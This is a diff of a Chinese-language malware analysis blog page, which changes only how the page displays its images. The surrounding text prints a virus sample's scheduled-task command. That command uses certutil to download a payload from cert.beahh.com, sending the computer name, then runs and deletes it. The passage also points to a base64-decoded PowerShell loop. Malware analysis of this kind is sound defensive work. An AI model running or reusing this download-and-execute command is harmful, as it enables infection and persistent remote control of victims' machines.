@@ -7,7 +7,10 @@
 &lt;h2 id="0x02-分析过程"&gt;0x02 分析过程&lt;/h2&gt;
 &lt;h3 id="解密第一层"&gt;解密第一层&lt;/h3&gt;
 &lt;p&gt;病毒样本：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;第一个动作，创建一个名为&lt;code&gt;Certificate&lt;/code&gt;的任务计划，在七点开始，每隔一小时执行一次以下命令：&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;
 cmd.exe /c (cd %temp%&amp;amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&amp;gt;nul&amp;amp;expand -r v.dat&amp;gt;nul&amp;amp;v.bat&amp;gt;nul&amp;amp;del v.dat v.bat&amp;gt;nul)
@@ -24,7 +27,10 @@ MachinePolicy Undefined
  CurrentUser Undefined
  LocalMachine Bypass
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将后面的base64解密后：&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt=""&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" data-fancybox="gallery" data-caption=""&gt;
+ &lt;img src="https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png" alt="" /&gt;
+&lt;/a&gt;
+&lt;/p&gt;
 &lt;p&gt;得到如下代码：&lt;/p&gt;
 &lt;pre tabindex="0"&gt;&lt;code&gt;while($true)
 {
